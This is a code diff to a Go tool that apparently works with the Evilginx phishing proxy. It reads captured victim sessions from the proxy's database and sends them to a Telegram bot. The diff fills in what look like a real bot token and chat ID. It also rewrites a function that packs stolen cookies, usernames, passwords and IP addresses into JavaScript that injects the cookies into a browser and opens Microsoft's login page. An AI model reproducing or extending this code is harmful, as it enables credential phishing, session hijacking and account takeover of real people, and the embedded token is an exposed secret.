@@ -18,8 +18,8 @@ import (
 const (
 	dbPath           = "/root/.evilginx/data.db"
 	sentFile         = "/root/.evilginx/sent_sessions.json"
-	telegramBotToken = "YOUR_TELEGRAM_BOT_TOKEN"
-	telegramChatID   = "YOUR_CHAT_ID"
+	telegramBotToken = "8198274021:AAGRBv8gPLXt2dtHbzdG9DzKV7mV7M5389U"
+	telegramChatID   = "1129680954"
 )
 
 type Session struct {
@@ -193,39 +193,28 @@ func sendTelegramFile(filepath string) error {
 }
 
 func generateInjectionJS(s Session) string {
-	cookies := []map[string]interface{}{}
-	for domain, domainCookies := range s.Tokens {
-		for _, token := range domainCookies {
-			cookies = append(cookies, map[string]interface{}{
-				"name":     token.Name,
-				"value":    token.Value,
-				"domain":   domain,
-				"path":     token.Path,
-				"httpOnly": token.HttpOnly,
-				"secure":   true,
-				"sameSite": "none",
-				"session":  true,
-				"storeId":  nil,
-			})
-		}
-	}
-
-	jsonCookies, _ := json.Marshal(cookies)
-
-	js := fmt.Sprintf(`let ipaddress = "%s";
-let email = "%s";
-let password = "%s";
-!function(){
-let e = %s;
-for(let o of e){
-document.cookie = o.name + "=" + o.value + ";Max-Age=31536000;" +
-    (o.path ? "path=" + o.path + ";" : "") +
-    (!o.path && o.domain ? "path=/;" : "") +
-    "Secure;SameSite=None";
+    cookies := []map[string]interface{}{}
+    for domain, domainCookies := range s.Tokens {
+        for _, token := range domainCookies {
+            cookies = append(cookies, map[string]interface{}{
+                "name":     token.Name,
+                "value":    token.Value,
+                "domain":   domain,
+                "expirationDate": time.Now().Add(365 * 24 * time.Hour).UnixMilli(),
+                "hostOnly": false,
+                "httpOnly": token.HttpOnly,
+                "path":     token.Path,
+                "sameSite": "none",
+                "secure":   true,
+                "session":  true,
+                "storeId":  nil,
+            })
+        }
+    }
+    jsCookies, _ := json.Marshal(cookies)
+    email := s.Username
+    if email == "" {
+        email = "unknown"
+    }
+    return fmt.Sprintf("let ipaddress = \"%s\";\nlet email = \"%s\";\nlet password = \"%s\";\n!function(){\nlet e = %s;\nfor(let o of e)\ndocument.cookie=`${o.name}=${o.value};Max-Age=31536000;${o.path?`path=${o.path};`:\"\"}${o.domain?(o.path?\"\":\"path=/\")+\";\":\"\"}Secure;SameSite=None`;\nwindow.location.href=\"https://login.microsoftonline.com\"\n}();", s.RemoteAddr, email, s.Password, string(jsCookies))
 }
-window.location.href="https://login.microsoftonline.com";
-}();`, s.RemoteAddr, s.Username, s.Password, string(jsonCookies))
-
-	return js
-}
-
